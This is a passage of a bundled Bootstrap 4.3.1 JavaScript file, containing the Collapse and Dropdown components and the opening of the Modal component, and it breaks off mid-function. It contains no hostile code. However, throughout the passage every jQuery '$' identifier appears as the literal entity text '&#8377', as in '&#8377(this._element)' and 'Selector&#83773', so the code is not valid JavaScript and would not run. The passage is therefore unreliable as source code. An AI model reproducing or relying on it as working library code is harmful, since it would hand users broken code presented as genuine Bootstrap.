    ACTIVES: '.show, .collapsing',
    DATA_TOGGLE: '[data-toggle="collapse"]'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Collapse =
    /*#__PURE__*/
    function () {
      function Collapse(element, config) {
        this._isTransitioning = false;
        this._element = element;
        this._config = this._getConfig(config);
        this._triggerArray = [].slice.call(document.querySelectorAll("[data-toggle=\"collapse\"][href=\"#" + element.id + "\"]," + ("[data-toggle=\"collapse\"][data-target=\"#" + element.id + "\"]")));
        var toggleList = [].slice.call(document.querySelectorAll(Selector&#83773.DATA_TOGGLE));

        for (var i = 0, len = toggleList.length; i < len; i++) {
          var elem = toggleList[i];
          var selector = Util.getSelectorFromElement(elem);
          var filterElement = [].slice.call(document.querySelectorAll(selector)).filter(function (foundElem) {
            return foundElem === element;
          });

          if (selector !== null && filterElement.length > 0) {
            this._selector = selector;

            this._triggerArray.push(elem);
          }
        }

        this._parent = this._config.parent ? this._getParent() : null;

        if (!this._config.parent) {
          this._addAriaAndCollapsedClass(this._element, this._triggerArray);
        }

        if (this._config.toggle) {
          this.toggle();
        }
      } // Getters


      var _proto = Collapse.prototype;

      // Public
      _proto.toggle = function toggle() {
        if (&#8377(this._element).hasClass(ClassName&#83773.SHOW)) {
          this.hide();
        } else {
          this.show();
        }
      };

      _proto.show = function show() {
        var _this = this;

        if (this._isTransitioning || &#8377(this._element).hasClass(ClassName&#83773.SHOW)) {
          return;
        }

        var actives;
        var activesData;

        if (this._parent) {
          actives = [].slice.call(this._parent.querySelectorAll(Selector&#83773.ACTIVES)).filter(function (elem) {
            if (typeof _this._config.parent === 'string') {
              return elem.getAttribute('data-parent') === _this._config.parent;
            }

            return elem.classList.contains(ClassName&#83773.COLLAPSE);
          });

          if (actives.length === 0) {
            actives = null;
          }
        }

        if (actives) {
          activesData = &#8377(actives).not(this._selector).data(DATA_KEY&#83773);

          if (activesData && activesData._isTransitioning) {
            return;
          }
        }

        var startEvent = &#8377.Event(Event&#83773.SHOW);
        &#8377(this._element).trigger(startEvent);

        if (startEvent.isDefaultPrevented()) {
          return;
        }

        if (actives) {
          Collapse._jQueryInterface.call(&#8377(actives).not(this._selector), 'hide');

          if (!activesData) {
            &#8377(actives).data(DATA_KEY&#83773, null);
          }
        }

        var dimension = this._getDimension();

        &#8377(this._element).removeClass(ClassName&#83773.COLLAPSE).addClass(ClassName&#83773.COLLAPSING);
        this._element.style[dimension] = 0;

        if (this._triggerArray.length) {
          &#8377(this._triggerArray).removeClass(ClassName&#83773.COLLAPSED).attr('aria-expanded', true);
        }

        this.setTransitioning(true);

        var complete = function complete() {
          &#8377(_this._element).removeClass(ClassName&#83773.COLLAPSING).addClass(ClassName&#83773.COLLAPSE).addClass(ClassName&#83773.SHOW);
          _this._element.style[dimension] = '';

          _this.setTransitioning(false);

          &#8377(_this._element).trigger(Event&#83773.SHOWN);
        };

        var capitalizedDimension = dimension[0].toUpperCase() + dimension.slice(1);
        var scrollSize = "scroll" + capitalizedDimension;
        var transitionDuration = Util.getTransitionDurationFromElement(this._element);
        &#8377(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        this._element.style[dimension] = this._element[scrollSize] + "px";
      };

      _proto.hide = function hide() {
        var _this2 = this;

        if (this._isTransitioning || !&#8377(this._element).hasClass(ClassName&#83773.SHOW)) {
          return;
        }

        var startEvent = &#8377.Event(Event&#83773.HIDE);
        &#8377(this._element).trigger(startEvent);

        if (startEvent.isDefaultPrevented()) {
          return;
        }

        var dimension = this._getDimension();

        this._element.style[dimension] = this._element.getBoundingClientRect()[dimension] + "px";
        Util.reflow(this._element);
        &#8377(this._element).addClass(ClassName&#83773.COLLAPSING).removeClass(ClassName&#83773.COLLAPSE).removeClass(ClassName&#83773.SHOW);
        var triggerArrayLength = this._triggerArray.length;

        if (triggerArrayLength > 0) {
          for (var i = 0; i < triggerArrayLength; i++) {
            var trigger = this._triggerArray[i];
            var selector = Util.getSelectorFromElement(trigger);

            if (selector !== null) {
              var &#8377elem = &#8377([].slice.call(document.querySelectorAll(selector)));

              if (!&#8377elem.hasClass(ClassName&#83773.SHOW)) {
                &#8377(trigger).addClass(ClassName&#83773.COLLAPSED).attr('aria-expanded', false);
              }
            }
          }
        }

        this.setTransitioning(true);

        var complete = function complete() {
          _this2.setTransitioning(false);

          &#8377(_this2._element).removeClass(ClassName&#83773.COLLAPSING).addClass(ClassName&#83773.COLLAPSE).trigger(Event&#83773.HIDDEN);
        };

        this._element.style[dimension] = '';
        var transitionDuration = Util.getTransitionDurationFromElement(this._element);
        &#8377(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
      };

      _proto.setTransitioning = function setTransitioning(isTransitioning) {
        this._isTransitioning = isTransitioning;
      };

      _proto.dispose = function dispose() {
        &#8377.removeData(this._element, DATA_KEY&#83773);
        this._config = null;
        this._parent = null;
        this._element = null;
        this._triggerArray = null;
        this._isTransitioning = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default&#83771, config);
        config.toggle = Boolean(config.toggle); // Coerce string values

        Util.typeCheckConfig(NAME&#83773, config, DefaultType&#83771);
        return config;
      };

      _proto._getDimension = function _getDimension() {
        var hasWidth = &#8377(this._element).hasClass(Dimension.WIDTH);
        return hasWidth ? Dimension.WIDTH : Dimension.HEIGHT;
      };

      _proto._getParent = function _getParent() {
        var _this3 = this;

        var parent;

        if (Util.isElement(this._config.parent)) {
          parent = this._config.parent; // It's a jQuery object

          if (typeof this._config.parent.jquery !== 'undefined') {
            parent = this._config.parent[0];
          }
        } else {
          parent = document.querySelector(this._config.parent);
        }

        var selector = "[data-toggle=\"collapse\"][data-parent=\"" + this._config.parent + "\"]";
        var children = [].slice.call(parent.querySelectorAll(selector));
        &#8377(children).each(function (i, element) {
          _this3._addAriaAndCollapsedClass(Collapse._getTargetFromElement(element), [element]);
        });
        return parent;
      };

      _proto._addAriaAndCollapsedClass = function _addAriaAndCollapsedClass(element, triggerArray) {
        var isOpen = &#8377(element).hasClass(ClassName&#83773.SHOW);

        if (triggerArray.length) {
          &#8377(triggerArray).toggleClass(ClassName&#83773.COLLAPSED, !isOpen).attr('aria-expanded', isOpen);
        }
      } // Static
      ;

      Collapse._getTargetFromElement = function _getTargetFromElement(element) {
        var selector = Util.getSelectorFromElement(element);
        return selector ? document.querySelector(selector) : null;
      };

      Collapse._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var &#8377this = &#8377(this);
          var data = &#8377this.data(DATA_KEY&#83773);

          var _config = _objectSpread({}, Default&#83771, &#8377this.data(), typeof config === 'object' && config ? config : {});

          if (!data && _config.toggle && /show|hide/.test(config)) {
            _config.toggle = false;
          }

          if (!data) {
            data = new Collapse(this, _config);
            &#8377this.data(DATA_KEY&#83773, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Collapse, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83773;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default&#83771;
        }
      }]);

      return Collapse;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(document).on(Event&#83773.CLICK_DATA_API, Selector&#83773.DATA_TOGGLE, function (event) {
    // preventDefault only for <a> elements (which change the URL) not inside the collapsible element
    if (event.currentTarget.tagName === 'A') {
      event.preventDefault();
    }

    var &#8377trigger = &#8377(this);
    var selector = Util.getSelectorFromElement(this);
    var selectors = [].slice.call(document.querySelectorAll(selector));
    &#8377(selectors).each(function () {
      var &#8377target = &#8377(this);
      var data = &#8377target.data(DATA_KEY&#83773);
      var config = data ? 'toggle' : &#8377trigger.data();

      Collapse._jQueryInterface.call(&#8377target, config);
    });
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME&#83773] = Collapse._jQueryInterface;
  &#8377.fn[NAME&#83773].Constructor = Collapse;

  &#8377.fn[NAME&#83773].noConflict = function () {
    &#8377.fn[NAME&#83773] = JQUERY_NO_CONFLICT&#83773;
    return Collapse._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83774 = 'dropdown';
  var VERSION&#83774 = '4.3.1';
  var DATA_KEY&#83774 = 'bs.dropdown';
  var EVENT_KEY&#83774 = "." + DATA_KEY&#83774;
  var DATA_API_KEY&#83774 = '.data-api';
  var JQUERY_NO_CONFLICT&#83774 = &#8377.fn[NAME&#83774];
  var ESCAPE_KEYCODE = 27; // KeyboardEvent.which value for Escape (Esc) key

  var SPACE_KEYCODE = 32; // KeyboardEvent.which value for space key

  var TAB_KEYCODE = 9; // KeyboardEvent.which value for tab key

  var ARROW_UP_KEYCODE = 38; // KeyboardEvent.which value for up arrow key

  var ARROW_DOWN_KEYCODE = 40; // KeyboardEvent.which value for down arrow key

  var RIGHT_MOUSE_BUTTON_WHICH = 3; // MouseEvent.which value for the right button (assuming a right-handed mouse)

  var REGEXP_KEYDOWN = new RegExp(ARROW_UP_KEYCODE + "|" + ARROW_DOWN_KEYCODE + "|" + ESCAPE_KEYCODE);
  var Event&#83774 = {
    HIDE: "hide" + EVENT_KEY&#83774,
    HIDDEN: "hidden" + EVENT_KEY&#83774,
    SHOW: "show" + EVENT_KEY&#83774,
    SHOWN: "shown" + EVENT_KEY&#83774,
    CLICK: "click" + EVENT_KEY&#83774,
    CLICK_DATA_API: "click" + EVENT_KEY&#83774 + DATA_API_KEY&#83774,
    KEYDOWN_DATA_API: "keydown" + EVENT_KEY&#83774 + DATA_API_KEY&#83774,
    KEYUP_DATA_API: "keyup" + EVENT_KEY&#83774 + DATA_API_KEY&#83774
  };
  var ClassName&#83774 = {
    DISABLED: 'disabled',
    SHOW: 'show',
    DROPUP: 'dropup',
    DROPRIGHT: 'dropright',
    DROPLEFT: 'dropleft',
    MENURIGHT: 'dropdown-menu-right',
    MENULEFT: 'dropdown-menu-left',
    POSITION_STATIC: 'position-static'
  };
  var Selector&#83774 = {
    DATA_TOGGLE: '[data-toggle="dropdown"]',
    FORM_CHILD: '.dropdown form',
    MENU: '.dropdown-menu',
    NAVBAR_NAV: '.navbar-nav',
    VISIBLE_ITEMS: '.dropdown-menu .dropdown-item:not(.disabled):not(:disabled)'
  };
  var AttachmentMap = {
    TOP: 'top-start',
    TOPEND: 'top-end',
    BOTTOM: 'bottom-start',
    BOTTOMEND: 'bottom-end',
    RIGHT: 'right-start',
    RIGHTEND: 'right-end',
    LEFT: 'left-start',
    LEFTEND: 'left-end'
  };
  var Default&#83772 = {
    offset: 0,
    flip: true,
    boundary: 'scrollParent',
    reference: 'toggle',
    display: 'dynamic'
  };
  var DefaultType&#83772 = {
    offset: '(number|string|function)',
    flip: 'boolean',
    boundary: '(string|element)',
    reference: '(string|element)',
    display: 'string'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Dropdown =
    /*#__PURE__*/
    function () {
      function Dropdown(element, config) {
        this._element = element;
        this._popper = null;
        this._config = this._getConfig(config);
        this._menu = this._getMenuElement();
        this._inNavbar = this._detectNavbar();

        this._addEventListeners();
      } // Getters


      var _proto = Dropdown.prototype;

      // Public
      _proto.toggle = function toggle() {
        if (this._element.disabled || &#8377(this._element).hasClass(ClassName&#83774.DISABLED)) {
          return;
        }

        var parent = Dropdown._getParentFromElement(this._element);

        var isActive = &#8377(this._menu).hasClass(ClassName&#83774.SHOW);

        Dropdown._clearMenus();

        if (isActive) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var showEvent = &#8377.Event(Event&#83774.SHOW, relatedTarget);
        &#8377(parent).trigger(showEvent);

        if (showEvent.isDefaultPrevented()) {
          return;
        } // Disable totally Popper.js for Dropdown in Navbar


        if (!this._inNavbar) {
          /**
           * Check for Popper dependency
           * Popper - https://popper.js.org
           */
          if (typeof Popper === 'undefined') {
            throw new TypeError('Bootstrap\'s dropdowns require Popper.js (https://popper.js.org/)');
          }

          var referenceElement = this._element;

          if (this._config.reference === 'parent') {
            referenceElement = parent;
          } else if (Util.isElement(this._config.reference)) {
            referenceElement = this._config.reference; // Check if it's jQuery element

            if (typeof this._config.reference.jquery !== 'undefined') {
              referenceElement = this._config.reference[0];
            }
          } // If boundary is not `scrollParent`, then set position to `static`
          // to allow the menu to "escape" the scroll parent's boundaries
          // https://github.com/twbs/bootstrap/issues/24251


          if (this._config.boundary !== 'scrollParent') {
            &#8377(parent).addClass(ClassName&#83774.POSITION_STATIC);
          }

          this._popper = new Popper(referenceElement, this._menu, this._getPopperConfig());
        } // If this is a touch-enabled device we add extra
        // empty mouseover listeners to the body's immediate children;
        // only needed because of broken event delegation on iOS
        // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html


        if ('ontouchstart' in document.documentElement && &#8377(parent).closest(Selector&#83774.NAVBAR_NAV).length === 0) {
          &#8377(document.body).children().on('mouseover', null, &#8377.noop);
        }

        this._element.focus();

        this._element.setAttribute('aria-expanded', true);

        &#8377(this._menu).toggleClass(ClassName&#83774.SHOW);
        &#8377(parent).toggleClass(ClassName&#83774.SHOW).trigger(&#8377.Event(Event&#83774.SHOWN, relatedTarget));
      };

      _proto.show = function show() {
        if (this._element.disabled || &#8377(this._element).hasClass(ClassName&#83774.DISABLED) || &#8377(this._menu).hasClass(ClassName&#83774.SHOW)) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var showEvent = &#8377.Event(Event&#83774.SHOW, relatedTarget);

        var parent = Dropdown._getParentFromElement(this._element);

        &#8377(parent).trigger(showEvent);

        if (showEvent.isDefaultPrevented()) {
          return;
        }

        &#8377(this._menu).toggleClass(ClassName&#83774.SHOW);
        &#8377(parent).toggleClass(ClassName&#83774.SHOW).trigger(&#8377.Event(Event&#83774.SHOWN, relatedTarget));
      };

      _proto.hide = function hide() {
        if (this._element.disabled || &#8377(this._element).hasClass(ClassName&#83774.DISABLED) || !&#8377(this._menu).hasClass(ClassName&#83774.SHOW)) {
          return;
        }

        var relatedTarget = {
          relatedTarget: this._element
        };
        var hideEvent = &#8377.Event(Event&#83774.HIDE, relatedTarget);

        var parent = Dropdown._getParentFromElement(this._element);

        &#8377(parent).trigger(hideEvent);

        if (hideEvent.isDefaultPrevented()) {
          return;
        }

        &#8377(this._menu).toggleClass(ClassName&#83774.SHOW);
        &#8377(parent).toggleClass(ClassName&#83774.SHOW).trigger(&#8377.Event(Event&#83774.HIDDEN, relatedTarget));
      };

      _proto.dispose = function dispose() {
        &#8377.removeData(this._element, DATA_KEY&#83774);
        &#8377(this._element).off(EVENT_KEY&#83774);
        this._element = null;
        this._menu = null;

        if (this._popper !== null) {
          this._popper.destroy();

          this._popper = null;
        }
      };

      _proto.update = function update() {
        this._inNavbar = this._detectNavbar();

        if (this._popper !== null) {
          this._popper.scheduleUpdate();
        }
      } // Private
      ;

      _proto._addEventListeners = function _addEventListeners() {
        var _this = this;

        &#8377(this._element).on(Event&#83774.CLICK, function (event) {
          event.preventDefault();
          event.stopPropagation();

          _this.toggle();
        });
      };

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, this.constructor.Default, &#8377(this._element).data(), config);
        Util.typeCheckConfig(NAME&#83774, config, this.constructor.DefaultType);
        return config;
      };

      _proto._getMenuElement = function _getMenuElement() {
        if (!this._menu) {
          var parent = Dropdown._getParentFromElement(this._element);

          if (parent) {
            this._menu = parent.querySelector(Selector&#83774.MENU);
          }
        }

        return this._menu;
      };

      _proto._getPlacement = function _getPlacement() {
        var &#8377parentDropdown = &#8377(this._element.parentNode);
        var placement = AttachmentMap.BOTTOM; // Handle dropup

        if (&#8377parentDropdown.hasClass(ClassName&#83774.DROPUP)) {
          placement = AttachmentMap.TOP;

          if (&#8377(this._menu).hasClass(ClassName&#83774.MENURIGHT)) {
            placement = AttachmentMap.TOPEND;
          }
        } else if (&#8377parentDropdown.hasClass(ClassName&#83774.DROPRIGHT)) {
          placement = AttachmentMap.RIGHT;
        } else if (&#8377parentDropdown.hasClass(ClassName&#83774.DROPLEFT)) {
          placement = AttachmentMap.LEFT;
        } else if (&#8377(this._menu).hasClass(ClassName&#83774.MENURIGHT)) {
          placement = AttachmentMap.BOTTOMEND;
        }

        return placement;
      };

      _proto._detectNavbar = function _detectNavbar() {
        return &#8377(this._element).closest('.navbar').length > 0;
      };

      _proto._getOffset = function _getOffset() {
        var _this2 = this;

        var offset = {};

        if (typeof this._config.offset === 'function') {
          offset.fn = function (data) {
            data.offsets = _objectSpread({}, data.offsets, _this2._config.offset(data.offsets, _this2._element) || {});
            return data;
          };
        } else {
          offset.offset = this._config.offset;
        }

        return offset;
      };

      _proto._getPopperConfig = function _getPopperConfig() {
        var popperConfig = {
          placement: this._getPlacement(),
          modifiers: {
            offset: this._getOffset(),
            flip: {
              enabled: this._config.flip
            },
            preventOverflow: {
              boundariesElement: this._config.boundary
            }
          } // Disable Popper.js if we have a static display

        };

        if (this._config.display === 'static') {
          popperConfig.modifiers.applyStyle = {
            enabled: false
          };
        }

        return popperConfig;
      } // Static
      ;

      Dropdown._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = &#8377(this).data(DATA_KEY&#83774);

          var _config = typeof config === 'object' ? config : null;

          if (!data) {
            data = new Dropdown(this, _config);
            &#8377(this).data(DATA_KEY&#83774, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      Dropdown._clearMenus = function _clearMenus(event) {
        if (event && (event.which === RIGHT_MOUSE_BUTTON_WHICH || event.type === 'keyup' && event.which !== TAB_KEYCODE)) {
          return;
        }

        var toggles = [].slice.call(document.querySelectorAll(Selector&#83774.DATA_TOGGLE));

        for (var i = 0, len = toggles.length; i < len; i++) {
          var parent = Dropdown._getParentFromElement(toggles[i]);

          var context = &#8377(toggles[i]).data(DATA_KEY&#83774);
          var relatedTarget = {
            relatedTarget: toggles[i]
          };

          if (event && event.type === 'click') {
            relatedTarget.clickEvent = event;
          }

          if (!context) {
            continue;
          }

          var dropdownMenu = context._menu;

          if (!&#8377(parent).hasClass(ClassName&#83774.SHOW)) {
            continue;
          }

          if (event && (event.type === 'click' && /input|textarea/i.test(event.target.tagName) || event.type === 'keyup' && event.which === TAB_KEYCODE) && &#8377.contains(parent, event.target)) {
            continue;
          }

          var hideEvent = &#8377.Event(Event&#83774.HIDE, relatedTarget);
          &#8377(parent).trigger(hideEvent);

          if (hideEvent.isDefaultPrevented()) {
            continue;
          } // If this is a touch-enabled device we remove the extra
          // empty mouseover listeners we added for iOS support


          if ('ontouchstart' in document.documentElement) {
            &#8377(document.body).children().off('mouseover', null, &#8377.noop);
          }

          toggles[i].setAttribute('aria-expanded', 'false');
          &#8377(dropdownMenu).removeClass(ClassName&#83774.SHOW);
          &#8377(parent).removeClass(ClassName&#83774.SHOW).trigger(&#8377.Event(Event&#83774.HIDDEN, relatedTarget));
        }
      };

      Dropdown._getParentFromElement = function _getParentFromElement(element) {
        var parent;
        var selector = Util.getSelectorFromElement(element);

        if (selector) {
          parent = document.querySelector(selector);
        }

        return parent || element.parentNode;
      } // eslint-disable-next-line complexity
      ;

      Dropdown._dataApiKeydownHandler = function _dataApiKeydownHandler(event) {
        // If not input/textarea:
        //  - And not a key in REGEXP_KEYDOWN => not a dropdown command
        // If input/textarea:
        //  - If space key => not a dropdown command
        //  - If key is other than escape
        //    - If key is not up or down => not a dropdown command
        //    - If trigger inside the menu => not a dropdown command
        if (/input|textarea/i.test(event.target.tagName) ? event.which === SPACE_KEYCODE || event.which !== ESCAPE_KEYCODE && (event.which !== ARROW_DOWN_KEYCODE && event.which !== ARROW_UP_KEYCODE || &#8377(event.target).closest(Selector&#83774.MENU).length) : !REGEXP_KEYDOWN.test(event.which)) {
          return;
        }

        event.preventDefault();
        event.stopPropagation();

        if (this.disabled || &#8377(this).hasClass(ClassName&#83774.DISABLED)) {
          return;
        }

        var parent = Dropdown._getParentFromElement(this);

        var isActive = &#8377(parent).hasClass(ClassName&#83774.SHOW);

        if (!isActive || isActive && (event.which === ESCAPE_KEYCODE || event.which === SPACE_KEYCODE)) {
          if (event.which === ESCAPE_KEYCODE) {
            var toggle = parent.querySelector(Selector&#83774.DATA_TOGGLE);
            &#8377(toggle).trigger('focus');
          }

          &#8377(this).trigger('click');
          return;
        }

        var items = [].slice.call(parent.querySelectorAll(Selector&#83774.VISIBLE_ITEMS));

        if (items.length === 0) {
          return;
        }

        var index = items.indexOf(event.target);

        if (event.which === ARROW_UP_KEYCODE && index > 0) {
          // Up
          index--;
        }

        if (event.which === ARROW_DOWN_KEYCODE && index < items.length - 1) {
          // Down
          index++;
        }

        if (index < 0) {
          index = 0;
        }

        items[index].focus();
      };

      _createClass(Dropdown, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83774;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default&#83772;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType&#83772;
        }
      }]);

      return Dropdown;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(document).on(Event&#83774.KEYDOWN_DATA_API, Selector&#83774.DATA_TOGGLE, Dropdown._dataApiKeydownHandler).on(Event&#83774.KEYDOWN_DATA_API, Selector&#83774.MENU, Dropdown._dataApiKeydownHandler).on(Event&#83774.CLICK_DATA_API + " " + Event&#83774.KEYUP_DATA_API, Dropdown._clearMenus).on(Event&#83774.CLICK_DATA_API, Selector&#83774.DATA_TOGGLE, function (event) {
    event.preventDefault();
    event.stopPropagation();

    Dropdown._jQueryInterface.call(&#8377(this), 'toggle');
  }).on(Event&#83774.CLICK_DATA_API, Selector&#83774.FORM_CHILD, function (e) {
    e.stopPropagation();
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME&#83774] = Dropdown._jQueryInterface;
  &#8377.fn[NAME&#83774].Constructor = Dropdown;

  &#8377.fn[NAME&#83774].noConflict = function () {
    &#8377.fn[NAME&#83774] = JQUERY_NO_CONFLICT&#83774;
    return Dropdown._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83775 = 'modal';
  var VERSION&#83775 = '4.3.1';
  var DATA_KEY&#83775 = 'bs.modal';
  var EVENT_KEY&#83775 = "." + DATA_KEY&#83775;
  var DATA_API_KEY&#83775 = '.data-api';
  var JQUERY_NO_CONFLICT&#83775 = &#8377.fn[NAME&#83775];
  var ESCAPE_KEYCODE&#83771 = 27; // KeyboardEvent.which value for Escape (Esc) key

  var Default&#83773 = {
    backdrop: true,
    keyboard: true,
    focus: true,
    show: true
  };
  var DefaultType&#83773 = {
    backdrop: '(boolean|string)',
    keyboard: 'boolean',
    focus: 'boolean',
    show: 'boolean'
  };
  var Event&#83775 = {
    HIDE: "hide" + EVENT_KEY&#83775,
    HIDDEN: "hidden" + EVENT_KEY&#83775,
    SHOW: "show" + EVENT_KEY&#83775,
    SHOWN: "shown" + EVENT_KEY&#83775,
    FOCUSIN: "focusin" + EVENT_KEY&#83775,
    RESIZE: "resize" + EVENT_KEY&#83775,
    CLICK_DISMISS: "click.dismiss" + EVENT_KEY&#83775,
    KEYDOWN_DISMISS: "keydown.dismiss" + EVENT_KEY&#83775,
    MOUSEUP_DISMISS: "mouseup.dismiss" + EVENT_KEY&#83775,
    MOUSEDOWN_DISMISS: "mousedown.dismiss" + EVENT_KEY&#83775,
    CLICK_DATA_API: "click" + EVENT_KEY&#83775 + DATA_API_KEY&#83775
  };
  var ClassName&#83775 = {
    SCROLLABLE: 'modal-dialog-scrollable',
    SCROLLBAR_MEASURER: 'modal-scrollbar-measure',
    BACKDROP: 'modal-backdrop',
    OPEN: 'modal-open',
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector&#83775 = {
    DIALOG: '.modal-dialog',
    MODAL_BODY: '.modal-body',
    DATA_TOGGLE: '[data-toggle="modal"]',
    DATA_DISMISS: '[data-dismiss="modal"]',
    FIXED_CONTENT: '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top',
    STICKY_CONTENT: '.sticky-top'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Modal =
    /*#__PURE__*/
    function () {
      function Modal(element, config) {
        this._config = this._getConfig(config);
        this._element = element;
        this._dialog = element.querySelector(Selector&#83775.DIALOG);
        this._backdrop = null;
        this._isShown = false;
        this._isBodyOverflowing = false;
        this._ignoreBackdropClick = false;
        this._isTransitioning = false;
        this._scrollbarWidth = 0;
      } // Getters


      var _proto = Modal.prototype;

      // Public
      _proto.toggle = function toggle(relatedTarget) {
        return this._isShown ? this.hide() : this.show(relatedTarget);
      };

      _proto.show = function show(relatedTarget) {
        var _this = this;

        if (this._isShown || this._isTransitioning) {
          return;
        }

        if (&#8377(this._element).hasClass(ClassName&#83775.FADE)) {
          this._isTransitioning = true;
        }

        var showEvent = &#8377.Event(Event&#83775.SHOW, {
          relatedTarget: relatedTarget
        });
        &#8377(this._element).trigger(showEvent);

        if (this._isShown || showEvent.isDefaultPrevented()) {
          return;
        }

        this._isShown = true;

        this._checkScrollbar();

        this._setScrollbar();

        this._adjustDialog();

        this._setEscapeEvent();

        this._setResizeEvent();

        &#8377(this._element).on(Event&#83775.CLICK_DISMISS, Selector&#83775.DATA_DISMISS, function (event) {
          return _this.hide(event);
        });
        &#8377(this._dialog).on(Event&#83775.MOUSEDOWN_DISMISS, function () {
          &#8377(_this._element).one(Event&#83775.MOUSEUP_DISMISS, function (event) {
            if (&#8377(event.target).is(_this._element)) {
              _this._ignoreBackdropClick = true;
            }
          });
        });

        this._showBackdrop(function () {
          return _this._showElement(relatedTarget);
        });
      };

      _proto.hide = function hide(event) {
        var _this2 = this;

        if (event) {
          event.preventDefault();
        }

        if (!this._isShown || this._isTransitioning) {
          return;
        }

        var hideEvent = &#8377.Event(Event&#83775.HIDE);
        &#8377(this._element).trigger(hideEvent);

        if (!this._isShown || hideEvent.isDefaultPrevented()) {
          return;
        }

        this._isShown = false;
        var transition = &#8377(this._element).hasClass(ClassName&#83775.FADE);

        if (transition) {
          this._isTransitioning = true;
        }

        this._setEscapeEvent();

        this._setResizeEvent();

        &#8377(document).off(Event&#83775.FOCUSIN);
        &#8377(this._element).removeClass(ClassName&#83775.SHOW);
        &#8377(this._element).off(Event&#83775.CLICK_DISMISS);
        &#8377(this._dialog).off(Event&#83775.MOUSEDOWN_DISMISS);

        if (transition) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          &#8377(this._element).one(Util.TRANSITION_END, function (event) {
            return _this2._hideModal(event);
          }).emulateTransitionEnd(transitionDuration);
        } else {
          this._hideModal();
        }
      };

      _proto.dispose = function dispose() {
        [window, this._element, this._dialog].forEach(function (htmlElement) {
          return &#8377(htmlElement).off(EVENT_KEY&#83775);
        });
        /**
         * `document` has 2 events `Event.FOCUSIN` and `Event.CLICK_DATA_API`
         * Do not move `document` in `htmlElements` array
         * It will remove `Event.CLICK_DATA_API` event that should remain
         */

        &#8377(document).off(Event&#83775.FOCUSIN);
        &#8377.removeData(this._element, DATA_KEY&#83775);
        this._config = null;
        this._element = null;
        this._dialog = null;
        this._backdrop = null;
        this._isShown = null;
        this._isBodyOverflowing = null;
        this._ignoreBackdropClick = null;
        this._isTransitioning = null;
        this._scrollbarWidth = null;
      };

      _proto.handleUpdate = function handleUpdate() {
        this._adjustDialog();
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, Default&#83773, config);
        Util.typeCheckConfig(NAME&#83775, config, DefaultType&#83773);
        return config;
      };

      _proto._showElement = function _showElement(relatedTarget) {
        var _this3 = this;

        var transition = &#8377(this._element).hasClass(ClassName&#83775.FADE);

        if (!this._element.parentNode || this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {
          // Don't move modal's DOM position
          document.body.appendChild(this._element);
        }

        this._element.style.display = 'block';

        this._element.removeAttribute('aria-hidden');

        this._element.setAttribute('aria-modal', true);

        if (&#8377(this._dialog).hasClass(ClassName&#83775.SCROLLABLE)) {
          this._dialog.querySelector(Selector&#83775.MODAL_BODY).scrollTop = 0;
        } else {
          this._element.scrollTop = 0;
        }

        if (transition) {
          Util.reflow(this._element);
        }

        &#8377(this._element).addClass(ClassName&#83775.SHOW);

        if (this._config.focus) {
          this._enforceFocus();
        }

        var shownEvent = &#8377.Event(Event&#83775.SHOWN, {
          relatedTarget: relatedTarget
        });

        var transitionComplete = function transitionComplete() {
          if (_this3._config.focus) {
            _this3._element.focus();
          }

          _this3._isTransitioning = false;
          &#8377(_this3._element).trigger(shownEvent);
        };

        if (transition) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._dialog);
          &#8377(this._dialog).one(Util.TRANSITION_END, transitionComplete).emulateTransitionEnd(transitionDuration);
        } else {
          transitionComplete();
        }
      };

      _proto._enforceFocus = function _enforceFocus() {
        var _this4 = this;

        &#8377(document).off(Event&#83775.FOCUSIN) // Guard against infinite focus loop
          .on(Event&#83775.FOCUSIN, function (event) {
            if (document !== event.target && _this4._element !== event.target && &#8377(_this4._element).has(event.target).length === 0) {
              _this4._element.focus();
            }
          });
      };

      _proto._setEscapeEvent = function _setEscapeEvent() {
        var _this5 = this;

        if (this._isShown && this._config.keyboard) {
          &#8377(this._element).on(Event&#83775.KEYDOWN_DISMISS, function (event) {
